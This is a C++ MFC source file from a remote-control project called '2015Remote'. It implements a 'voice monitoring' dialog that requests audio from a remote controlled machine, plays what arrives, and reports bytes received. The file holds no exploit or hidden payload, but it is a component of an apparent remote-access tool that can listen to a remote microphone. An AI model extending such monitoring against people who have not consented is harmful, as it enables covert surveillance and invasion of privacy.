// AudioDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "AudioDlg.h"
#include "afxdialogex.h"


// CAudioDlg 对话框

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
: CDialog(CAudioDlg::IDD, pParent)
	, m_bSend(FALSE)
{
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_AUDIO));  //处理图标
	m_bIsWorking	= TRUE;
	m_bThreadRun	= FALSE;
	m_iocpServer	= IOCPServer;       //为类的成员变量赋值
	m_ContextObject		= ContextObject;
	m_hWorkThread  = NULL;
	m_nTotalRecvBytes = 0;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));        //得到被控端ip
	int iClientAddressLen = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->sClientSocket,(SOCKADDR*)&ClientAddress, &iClientAddressLen);

	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";
}

CAudioDlg::~CAudioDlg()
{
	m_bIsWorking = FALSE;
	while (m_bThreadRun)
		Sleep(50);
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Check(pDX, IDC_CHECK, m_bSend);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_CHECK, &CAudioDlg::OnBnClickedCheck)
END_MESSAGE_MAP()


// CAudioDlg 消息处理程序


BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon,FALSE);

	CString strString;
	strString.Format("%s - 语音监听", m_strIPAddress);
	SetWindowText(strString);

	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));

	//启动线程 判断CheckBox
	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	m_bThreadRun = m_hWorkThread ? TRUE : FALSE;

	// "发送本地语音"会导致崩溃，详见"OnBnClickedCheck"
	GetDlgItem(IDC_CHECK)->EnableWindow(FALSE);

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

DWORD  CAudioDlg::WorkThread(LPVOID lParam)
{
	CAudioDlg	*This = (CAudioDlg *)lParam;

	while (This->m_bIsWorking)
	{
		if (!This->m_bSend)
		{
			WAIT(This->m_bIsWorking, 1, 50);
			continue;
		}
		DWORD	dwBufferSize = 0;
		LPBYTE	szBuffer = This->m_AudioObject.GetRecordBuffer(&dwBufferSize);   //播放声音

		if (szBuffer != NULL && dwBufferSize > 0)
			This->m_iocpServer->OnClientPreSending(This->m_ContextObject, szBuffer, dwBufferSize); //没有消息头
	}
	This->m_bThreadRun = FALSE;

	return 0;
}

void CAudioDlg::OnReceiveComplete(void)
{
	m_nTotalRecvBytes += m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;   //1000+ =1000 1
	CString	strString;
	strString.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, strString);
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
		{
			m_AudioObject.PlayBuffer(m_ContextObject->InDeCompressedBuffer.GetBuffer(1), 
				m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);   //播放波形数据
			break;
		}

	default:
		// 传输发生异常数据
		break;
	}
}

void CAudioDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
#if CLOSE_DELETE_DLG
	m_ContextObject->v1 = 0;
#endif
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);

	m_bIsWorking = FALSE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();
#if CLOSE_DELETE_DLG
	delete this;
#endif
}

// 处理是否发送本地语音到远程
void CAudioDlg::OnBnClickedCheck()
{
	// @notice 2019.1.26
	// 如果启用"发送本地语音"，则被控端崩溃在zlib inffas32.asm
	// 需将主控端zlib拷贝到被控端重新编译
	// 但是即使这样，主控端在开启"发送本地语音"时容易崩溃
	// 此现象类似于操作远程桌面时的随机崩溃。原因不明
	UpdateData(true);
}
